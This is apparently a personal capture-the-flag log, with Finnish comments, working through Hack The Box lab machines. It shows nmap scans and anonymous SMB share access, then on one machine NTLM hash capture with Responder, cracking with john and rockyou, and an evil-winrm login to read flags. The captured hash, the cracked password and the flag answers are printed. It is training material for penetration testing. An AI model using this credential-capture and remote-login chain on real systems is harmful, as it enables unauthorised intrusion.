```
sudo openvpn --config ~/htb/htb.ovpn


┌──(kali㉿kali)-[~]
└─$ ip a                      
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:04:42:0f brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 84468sec preferred_lft 84468sec
    inet6 fe80::bfdd:3903:807:a60e/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
3: eth1: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc fq_codel state DOWN group default qlen 1000
    link/ether 08:00:27:f3:01:ed brd ff:ff:ff:ff:ff:ff
4: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:65:8c:10:b2 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
5: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none 
    inet 10.10.15.63/23 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 dead:beef:2::113d/64 scope global 
       valid_lft forever preferred_lft forever
    inet6 fe80::b67f:4235:a652:1527/64 scope link stable-privacy proto kernel_ll 
       valid_lft forever preferred_lft forever
                                                     

┌──(kali㉿kali)-[~]
└─$ ip route get 10.129.23.145

10.129.23.145 via 10.10.14.1 dev tun0 src 10.10.15.63 uid 1000 
    cache 


┌──(kali㉿kali)-[~]
└─$ nmap -T4 -A -p- 10.129.23.145
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-05 13:53 EDT
Nmap scan report for 10.129.23.145
Host is up (0.031s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT      ADDRESS
1   33.34 ms 10.10.14.1
2   36.75 ms 10.129.23.145

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.30 seconds

***

DANCING

What is the service name for port 445 that came up in our Nmap scan? 

┌──(kali㉿kali)-[~]
└─$ nmap -T4 -A -p 445 10.129.96.147   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-05 14:11 EDT
Nmap scan report for 10.129.96.147
Host is up (0.031s latency).

PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019|2012|2022|2016|Vista (96%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_vista::sp1
Aggressive OS guesses: Microsoft Windows 10 1909 - 2004 (96%), Microsoft Windows Server 2019 (94%), Windows Server 2019 (92%), Microsoft Windows 10 1909 (92%), Microsoft Windows Server 2012 R2 (92%), Microsoft Windows Server 2022 (92%), Microsoft Windows 10 1709 - 21H2 (91%), Microsoft Windows 10 20H2 - 21H1 (90%), Microsoft Windows Server 2016 (90%), Microsoft Windows 10 20H2 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

Host script results:
|_clock-skew: 3h59m59s
| smb2-time: 
|   date: 2025-05-05T22:11:38
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   34.62 ms 10.10.14.1
2   34.77 ms 10.129.96.147

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.45 seconds

***

 What is the 'flag' or 'switch' that we can use with the smbclient utility to 'list' the available shares on Dancing?

-L

https://www.learnlinux.org.za/courses/build/net-admin/ch08s02.html

***

 How many shares are there on Dancing?

4

┌──(kali㉿kali)-[~]
└─$ smbclient -L 10.129.96.147 
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.96.147 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

***

https://www.learnlinux.org.za/courses/build/net-admin/ch08s02.html

┌──(kali㉿kali)-[~]
└─$ smbclient \\\\10.129.96.147\\WorkShares -N
Try "help" to get a list of possible commands.
smb: \> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
mkfifo         more           mput           newer          notify         
open           posix          posix_encrypt  posix_open     posix_mkdir    
posix_rmdir    posix_unlink   posix_whoami   print          prompt         
put            pwd            q              queue          quit           
readlink       rd             recurse        reget          rename         
reput          rm             rmdir          showacls       setea          
setmode        scopy          stat           symlink        tar            
tarmode        timeout        translate      unlock         volume         
vuid           wdel           logon          listconnect    showconnect    
tcon           tdis           tid            utimes         logoff         
..             !              
smb: \> ls
  .                                   D        0  Mon Mar 29 04:22:01 2021
  ..                                  D        0  Mon Mar 29 04:22:01 2021
  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
  James.P                             D        0  Thu Jun  3 04:38:03 2021


smb: \> tarmode 
tarmode is now full, system, hidden, noreset, noverbose
smb: \> help lcd
HELP lcd:
        [directory] change/report the local current working directory
smb: \> lcd /tmp
smb: \> recurse
smb: \> prompt
smb: \> mget 
Amy.J\    James.P\  
smb: \> mget ./
getting file \Amy.J\worknotes.txt of size 94 as Amy.J/worknotes.txt (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)
getting file \James.P\flag.txt of size 32 as James.P/flag.txt (0.2 KiloBytes/sec) (average 0.4 KiloBytes/sec)

┌──(kali㉿kali)-[~]
└─$ ls /tmp        
Amy.J
James.P
                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ cd /tmp/Amy.J                                                                                                         
                                                                                                                           
┌──(kali㉿kali)-[/tmp/Amy.J]
└─$ ls     
worknotes.txt
                                                                                                                           
┌──(kali㉿kali)-[/tmp/Amy.J]
└─$ cat worknotes.txt 
- start apache server on the linux machine
- secure the ftp server
- setup winrm on dancing                                                                                                                            
┌──(kali㉿kali)-[/tmp/Amy.J]
└─$ cd ..    
                                                                                                                                                                                                                   
┌──(kali㉿kali)-[/tmp]
└─$ cd James.P 
                                                                                                                                                                                                                   
┌──(kali㉿kali)-[/tmp/James.P]
└─$ ls
flag.txt
                                                                                                                                                                                                                   
┌──(kali㉿kali)-[/tmp/James.P]
└─$ cat flag.txt      
5f61c10dffbc77a704d76016a22f1664

***

When visiting the web service using the IP address, what is the domain that we are being redirected to?

┌──(kali㉿kali)-[~]
└─$ curl 10.129.186.74
<meta http-equiv="refresh" content="0;url=http://unika.htb/">

***

 Which scripting language is being used on the server to generate webpages?

PHP

┌──(kali㉿kali)-[~]
└─$ nmap -T4 -A 10.129.186.74 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-05 14:44 EDT
Nmap scan report for 10.129.186.74
Host is up (0.057s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019 (97%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019
Aggressive OS guesses: Microsoft Windows 10 1903 - 21H1 (97%), Microsoft Windows 10 1909 - 2004 (91%), Windows Server 2019 (91%), Microsoft Windows 10 1803 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   35.31 ms 10.10.14.1
2   35.42 ms 10.129.186.74

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.54 seconds

Jotta verkkosivulle pääsee, täytyy laittaa /etc/hosts 

10.129.186.74 unika.htb

***

 What does NTLM stand for?

https://www.crowdstrike.com/en-us/cybersecurity-101/identity-protection/windows-ntlm/

New Technology LAN Manager

***

Which flag do we use in the Responder utility to specify the network interface?

responder -> myrkytetään verkkosivun hostin kutsu meidän omasta ip:stä 

┌──(kali㉿kali)-[~]
└─$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:04:42:0f brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 78747sec preferred_lft 78747sec
    inet6 fe80::bfdd:3903:807:a60e/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
3: eth1: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc fq_codel state DOWN group default qlen 1000
    link/ether 08:00:27:f3:01:ed brd ff:ff:ff:ff:ff:ff
4: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:65:8c:10:b2 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
5: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none 
    inet 10.10.15.63/23 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 dead:beef:2::113d/64 scope global 
       valid_lft forever preferred_lft forever
    inet6 fe80::b67f:4235:a652:1527/64 scope link stable-privacy proto kernel_ll 
       valid_lft forever preferred_lft forever

otetaan ip 10.10.15.63 ja syötetään se urliin, jolloin verkkosivun host tulee hakemaan 
jonkin tiedoston meiltä. samalla responder nappaa hakijan tiedot NTLM takia.
┌──(kali㉿kali)-[~]
└─$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.15.63]
    Responder IPv6             [dead:beef:2::113d]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-XPF95QW4JYM]
    Responder Domain Name      [ARSG.LOCAL]
    Responder DCE-RPC Port     [48247]

[+] Listening for events...                                                                                                 

[SMB] NTLMv2-SSP Client   : 10.129.186.74
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:ab8baaf4398d62d8:ECD418624A9B4E129CF786076E9F4427:010100000000000000855A25D3BDDB01EFF8752AC19F219E0000000002000800410052005300470001001E00570049004E002D00580050004600390035005100570034004A0059004D0004003400570049004E002D00580050004600390035005100570034004A0059004D002E0041005200530047002E004C004F00430041004C000300140041005200530047002E004C004F00430041004C000500140041005200530047002E004C004F00430041004C000700080000855A25D3BDDB01060004000200000008003000300000000000000001000000002000000D5C76DE3078575B2855BDE75BB7D06A527ED47F7C0F5200162306A5A09FF7FE0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00360033000000000000000000             
[+] Exiting...
                                                                
┌──(kali㉿kali)-[~/stuff]
└─$ echo "Administrator::RESPONDER:ab8baaf4398d62d8:ECD418624A9B4E129CF786076E9F4427:010100000000000000855A25D3BDDB01EFF8752AC19F219E0000000002000800410052005300470001001E00570049004E002D00580050004600390035005100570034004A0059004D0004003400570049004E002D00580050004600390035005100570034004A0059004D002E0041005200530047002E004C004F00430041004C000300140041005200530047002E004C004F00430041004C000500140041005200530047002E004C004F00430041004C000700080000855A25D3BDDB01060004000200000008003000300000000000000001000000002000000D5C76DE3078575B2855BDE75BB7D06A527ED47F7C0F5200162306A5A09FF7FE0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00360033000000000000000000" | tee ntlmhash.txt

käytetään rockyou.txt:tä ja john the ripperiä

https://github.com/p-lemonish/course-penetration-testing/blob/master/h4.md

┌──(kali㉿kali)-[~/stuff]
└─$ john --wordlist=hashed/rockyou.txt ntlmhash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)     
1g 0:00:00:00 DONE (2025-05-05 15:44) 5.555g/s 22755p/s 22755c/s 22755C/s slimshady..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 

***

 We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?

aikaisemmin nmapatty 5985

https://learn.microsoft.com/en-us/answers/questions/1196102/how-to-enable-port-5985-in-winrm-service

viittaa, että portin takana odottaisi "winrm", kokeilin komentoa winrm kalilla.

┌──(kali㉿kali)-[~/stuff]
└─$ winrm                                      
Command 'winrm' not found, did you mean:
  command 'rwinrm' from deb ruby-winrm
Try: sudo apt install <deb name>

┌──(kali㉿kali)-[~/stuff]
└─$ rwinrm help    
help is an invalid host
Usage: rwinrm user@host

laitetaan user: Administrator ja host 10.129.186.74 ja salasana tietysti badminton

┌──(kali㉿kali)-[~/stuff]
└─$ rwinrm Administrator@10.129.186.74
Password: 
PS Administrator@10.129.186.74> dir
Authentication failed, bad user name or password

jotain outoa tapahtuu rwinrm kanssa, yritin monta erilaista komentoa ja versiota, mutta
tässä on huono dokumentointi. netistä löytyy `evil-winrm` josta löytyykin dokumentaatiota

┌──(kali㉿kali)-[~/stuff]
└─$ evil-winrm -h
                                        
Evil-WinRM shell v3.7

Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-a USERAGENT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]
    -S, --ssl                        Enable ssl
    -a, --user-agent USERAGENT       Specify connection user-agent (default Microsoft WinRM Client)
    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
        --spn SPN_PREFIX             SPN prefix for Kerberos auth (default HTTP)
    -e, --executables EXES_PATH      C# executables local path
    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required)
    -U, --url URL                    Remote url endpoint (default /wsman)
    -u, --user USER                  Username (required if not using kerberos)
    -p, --password PASS              Password
    -H, --hash HASH                  NTHash
    -P, --port PORT                  Remote host port (default 5985)
    -V, --version                    Show version
    -n, --no-colors                  Disable colors
    -N, --no-rpath-completion        Disable remote path completion
    -l, --log                        Log the WinRM session
    -h, --help                       Display this help message

┌──(kali㉿kali)-[~/stuff]
└─$ evil-winrm -i 10.129.186.74 -u Administrator -p badminton     
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---        10/11/2020   7:19 AM                3D Objects
d-r---        10/11/2020   7:19 AM                Contacts
d-r---          3/9/2022   5:34 PM                Desktop
d-r---         3/10/2022   4:51 AM                Documents
d-r---        10/11/2020   7:19 AM                Downloads
d-r---        10/11/2020   7:19 AM                Favorites
d-r---        10/11/2020   7:19 AM                Links
d-r---        10/11/2020   7:19 AM                Music
d-r---         4/27/2020   6:01 AM                OneDrive
d-r---        10/11/2020   7:19 AM                Pictures
d-r---        10/11/2020   7:19 AM                Saved Games
d-r---        10/11/2020   7:19 AM                Searches
d-r---        10/11/2020   7:19 AM                Videos


*Evil-WinRM* PS C:\Users\Administrator> cd ..
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          3/9/2022   5:35 PM                Administrator
d-----          3/9/2022   5:33 PM                mike
d-r---        10/10/2020  12:37 PM                Public


*Evil-WinRM* PS C:\Users> cd mike
*Evil-WinRM* PS C:\Users\mike> dir


    Directory: C:\Users\mike


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/10/2022   4:51 AM                Desktop


*Evil-WinRM* PS C:\Users\mike> cd Desktop
*Evil-WinRM* PS C:\Users\mike\Desktop> dir


    Directory: C:\Users\mike\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/10/2022   4:50 AM             32 flag.txt


*Evil-WinRM* PS C:\Users\mike\Desktop> cat flag.txt
ea81b7afddd03efaa0945333ed147fac

***

***


```
